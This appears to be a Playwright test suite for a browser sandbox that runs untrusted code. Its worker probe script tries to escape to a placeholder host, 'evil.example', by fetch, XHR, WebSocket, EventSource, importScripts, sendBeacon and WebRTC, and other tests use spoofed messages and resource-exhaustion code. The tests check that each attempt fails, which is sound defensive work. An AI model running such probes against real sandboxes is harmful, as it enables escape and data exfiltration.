import { test as raw } from '@playwright/test'
import { openSandbox, renderArtifact, runInFrame, serveRuntimes } from './fixtures/sandbox.ts'
import { expect, test } from './fixtures/test.ts'

/*
 * The sandbox escape suite, on every project. Code is run where untrusted code runs (a worker of the runner frame,
 * an artifact's nested frame after Run) and, harder, straight in the frames' own realms, and tries every way out: the
 * network (fetch, XHR, WebSocket, EventSource, sendBeacon, importScripts, dynamic import, images, styles, fonts,
 * WebRTC), navigation (meta refresh, the top window, nested frames, popups), storage (IndexedDB, CacheStorage, Web
 * Storage, cookies) and the app (a spoofed message). Every attempt must fail, and the network gate (e2e/gates.ts)
 * proves that no request left: one would be reported as outside the allowlist.
 */

test.use({ netPurposes: ['download'] })

const EVIL = 'https://evil.example'

/** Tries each way out from a worker and reports `blocked:<error>` or `allowed:<what>` for each. */
const WORKER_PROBES = `
const report = {}
const attempt = async (name, fn) => {
  try {
    const v = await Promise.race([fn(), new Promise((_, no) => setTimeout(() => no(new Error('timeout')), 3000))])
    report[name] = 'allowed:' + String(v)
  } catch (e) {
    report[name] = 'blocked:' + (e && e.name)
  }
}
const EVIL = '${EVIL}'
const settle = (target, ok, fail) => new Promise((res, rej) => { target[ok] = () => res('open'); target[fail] = () => rej(new Error('failed')) })
await attempt('fetch', () => fetch(EVIL + '/fetch'))
await attempt('xhr', () => { const x = new XMLHttpRequest(); x.open('GET', EVIL + '/xhr'); const p = settle(x, 'onload', 'onerror'); x.send(); return p })
await attempt('websocket', () => settle(new WebSocket('wss://evil.example/ws'), 'onopen', 'onerror'))
await attempt('eventsource', () => settle(new EventSource(EVIL + '/sse'), 'onopen', 'onerror'))
await attempt('importScripts', () => importScripts(EVIL + '/x.js'))
await attempt('sendBeacon', () => navigator.sendBeacon(EVIL + '/beacon', 'x') || Promise.reject(new Error('refused')))
await attempt('webrtc', () => new RTCPeerConnection({ iceServers: [{ urls: 'stun:evil.example:3478' }] }))
await attempt('indexedDB', () => new Promise((res, rej) => { const r = indexedDB.open('aparte'); r.onsuccess = () => res('opened'); r.onerror = () => rej(r.error) }))
await attempt('caches', () => caches.keys())
await attempt('worker', () => new Worker('data:text/javascript,1'))
await attempt('broadcast', () => new BroadcastChannel('aparte'))
return report
`

test('runner worker: every network, storage and channel API fails', async ({ page, context }) => {
  await serveRuntimes(context)
  await page.goto('./')
  await openSandbox(page, 'runner')
  const outcome = await runInFrame(page, { language: 'javascript', code: WORKER_PROBES })
  expect(outcome.status).toBe('ok')
  const report = JSON.parse(outcome.value ?? '{}') as Record<string, string>
  expect(Object.keys(report).sort()).toEqual(
    [
      'broadcast',
      'caches',
      'eventsource',
      'fetch',
      'importScripts',
      'indexedDB',
      'sendBeacon',
      'webrtc',
      'websocket',
      'worker',
      'xhr',
    ].sort(),
  )
  for (const [name, result] of Object.entries(report))
    expect([name, result]).toEqual([name, expect.stringMatching(/^blocked:/)])
})

// Opened top-level (which the app never does) a browser probes /favicon.ico, blocked by img-src 'none' on some
// engines; that engine-specific noise is irrelevant to the guard, so this check runs without the network gate.
raw('the runner refuses to run as a top-level page', async ({ page, baseURL }) => {
  await page.goto(new URL('sandbox/runner.html', baseURL ?? '').href)
  await expect(page.locator('body')).toContainText('runs only inside')
})

test('the runner and artifact pages have no network of their own', async ({ page, gates }) => {
  // Their meta CSP has connect-src 'none' and no host for any load, so the opaque-origin frame reaches nothing.
  await page.goto('./')
  await openSandbox(page, 'runner')
  await openSandbox(page, 'artifact')
  // Every origin the context contacted was the app's own (the pages and their scripts); none was foreign.
  expect([...gates.contacted.values()].filter((k) => k !== 'app')).toEqual([])
})

test('a message that is not a valid run is ignored (no result)', async ({ page }) => {
  await page.goto('./')
  await openSandbox(page, 'runner')
  const answered = await page.evaluate(async () => {
    const iframe = document.querySelector<HTMLIFrameElement>('iframe[data-test-sandbox="runner"]')
    if (iframe?.contentWindow == null) throw new Error('no frame')
    let got = false
    const listener = (event: MessageEvent) => {
      if (event.source === iframe.contentWindow && (event.data as { type?: string } | null)?.type === 'result')
        got = true
    }
    window.addEventListener('message', listener)
    // A wrong protocol, a run without an id, and a plain object: each must be dropped by the schema check.
    iframe.contentWindow.postMessage(
      { p: 'other/9', type: 'run', id: 'x'.repeat(32), language: 'javascript', code: '1' },
      '*',
    )
    iframe.contentWindow.postMessage({ p: 'aparte-sandbox/1', type: 'run', language: 'javascript', code: '1' }, '*')
    iframe.contentWindow.postMessage('hello', '*')
    await new Promise((r) => setTimeout(r, 400))
    window.removeEventListener('message', listener)
    return got
  })
  expect(answered).toBe(false)
})

test('a JavaScript run that never ends is stopped at its time limit', async ({ page, context }) => {
  await serveRuntimes(context)
  await page.goto('./')
  await openSandbox(page, 'runner')
  const outcome = await runInFrame(page, { language: 'javascript', code: 'for (;;) {}', limits: { timeoutMs: 2000 } })
  expect(outcome.status).toBe('timeout')
})

test('output past the cap is cut, not kept whole', async ({ page, context }) => {
  await serveRuntimes(context)
  await page.goto('./')
  await openSandbox(page, 'runner')
  const outcome = await runInFrame(page, {
    language: 'javascript',
    code: 'for (let i = 0; i < 100000; i++) console.log("spam-".repeat(20))',
    limits: { outputChars: 5000 },
  })
  expect(outcome.truncated).toBe(true)
  expect(outcome.stdout.length).toBeLessThanOrEqual(5000)
})

test('a run HTML artifact executes its script, contained in an opaque-origin frame', async ({ page }) => {
  await page.goto('./')
  await openSandbox(page, 'artifact')
  // A marker the artifact's script posts up once it runs; the frame is allow-scripts after Run.
  const ran = page.evaluate(
    () =>
      new Promise<boolean>((resolve) => {
        const timer = setTimeout(() => resolve(false), 4000)
        window.addEventListener('message', (e) => {
          if ((e.data as { artifactRan?: unknown } | null)?.artifactRan === true) {
            clearTimeout(timer)
            resolve(true)
          }
        })
      }),
  )
  await renderArtifact(page, {
    kind: 'html',
    source: '<p>hi</p><script>top.postMessage({ artifactRan: true }, "*")</script>',
    run: true,
  })
  expect(await ran).toBe(true)
  const nested = page.frameLocator('iframe[data-test-sandbox="artifact"]').locator('#root > iframe')
  await expect(nested).toHaveAttribute('sandbox', 'allow-scripts')
  // The script ran but reached nothing off the app's origin (the gate confirms no foreign request).
})

// The gate injects a recorder into every frame; an inert frame (sandbox="") blocks even that, which the browser
// logs. Production injects nothing, so this one behavioural check runs without the gate, to prove the default is inert.
raw('an artifact shown without Run never executes its script', async ({ page, baseURL }) => {
  await page.goto(baseURL ?? './')
  await openSandbox(page, 'artifact')
  const ran = page.evaluate(
    () =>
      new Promise<boolean>((resolve) => {
        setTimeout(() => resolve(false), 2500)
        window.addEventListener('message', (e) => {
          if ((e.data as { artifactRan?: unknown } | null)?.artifactRan === true) resolve(true)
        })
      }),
  )
  await renderArtifact(page, {
    kind: 'html',
    source: '<p>hi</p><script>top.postMessage({ artifactRan: true }, "*")</script>',
    run: false,
  })
  expect(await ran).toBe(false)
  const nested = page.frameLocator('iframe[data-test-sandbox="artifact"]').locator('#root > iframe')
  await expect(nested).toHaveAttribute('sandbox', '')
})

test('a Mermaid diagram renders to an image from the pinned, hash-checked bundle', async ({ page, context }) => {
  await serveRuntimes(context)
  await page.goto('./')
  await openSandbox(page, 'artifact')
  const out = await renderArtifact(page, { kind: 'mermaid', source: 'graph TD; A-->B; B-->C' })
  expect(out.type).toBe('rendered')
  expect(out.height ?? 0).toBeGreaterThan(0)
  // The rendered diagram is shown as an image (no live SVG DOM from the model), inside the opaque-origin frame.
  const img = page.frameLocator('iframe[data-test-sandbox="artifact"]').locator('#root > img')
  await expect(img).toHaveCount(1)
})

test('Python runs with numpy, pandas and matplotlib, returning a value, a figure and a file', async ({
  page,
  context,
}) => {
  test.setTimeout(240_000)
  await serveRuntimes(context)
  await page.goto('./')
  await openSandbox(page, 'runner')
  const code = [
    'import numpy as np',
    'import pandas as pd',
    'import matplotlib.pyplot as plt',
    'df = pd.DataFrame({"x": np.arange(5), "y": np.arange(5) ** 2})',
    'df.to_csv("squares.csv", index=False)',
    'plt.plot(df.x, df.y)',
    'print("rows", len(df))',
    'int(df.y.sum())',
  ].join('\n')
  const outcome = await runInFrame(page, { language: 'python', code, packages: ['matplotlib', 'pandas'] })
  expect(outcome.status).toBe('ok')
  expect(outcome.value).toBe('30')
  expect(outcome.stdout).toContain('rows 5')
  expect(outcome.images).toBe(1)
  expect(outcome.files.map((f) => f.name)).toContain('squares.csv')
  expect(outcome.files.find((f) => f.name === 'squares.csv')?.text).toContain('0,0')
  expect(outcome.packages).toEqual(expect.arrayContaining(['numpy', 'pandas', 'matplotlib']))
})

test('a Python run that asks for too much memory is stopped at its cap', async ({ page, context }) => {
  test.setTimeout(240_000)
  await serveRuntimes(context)
  await page.goto('./')
  await openSandbox(page, 'runner')
  const outcome = await runInFrame(page, { language: 'python', code: 'b = bytearray(1500 * 1024 * 1024)\nlen(b)' })
  expect(outcome.status).toBe('memory')
})
